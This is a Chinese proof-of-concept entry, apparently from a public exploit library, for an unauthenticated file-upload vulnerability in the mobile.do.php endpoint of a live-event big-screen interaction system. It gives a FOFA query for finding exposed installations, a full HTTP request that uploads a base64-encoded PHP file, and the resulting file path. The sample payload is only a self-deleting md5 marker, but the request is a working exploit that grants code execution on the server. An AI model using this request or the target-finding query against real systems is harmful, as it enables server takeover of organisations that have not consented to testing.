# 金华迪加网络科技有限公司现场大屏互动系统mobile.do.php接口存在文件上传漏洞

# 一、漏洞简介
金华迪加网络科技有限公司是一家民营企业，专注于开发和优化现场互动系统平台,其主要产品是现场活动大屏幕系统。这个系统被设计用于增强活动现场的互动性，提供技术支持给合作企业。金华迪加网络科技有限公司现场大屏互动系统mobile.do.php接口存在文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。

# 二、影响版本
+ 现场大屏互动系统

# 三、资产测绘
+ fofa`body="/wall/themes/meepo/assets/images/defaultbg.jpg"||title="现场活动大屏幕系统"`
+ 特征


# 三、漏洞复现
```plain
POST /mobile/mobile.do.php?action=msg_uploadimg HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Cookie: PHPSESSID=b8u1t0sl69oh62hn91t3tb61a2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

filetype=php&imgbase64=PD9waHAgZWNobyBtZDUoMSk7dW5saW5rKF9fRklMRV9fKTsgPz4=
```


```plain
/data/pic/pic_173026980616947.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ooo15ulb6mttxdqb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
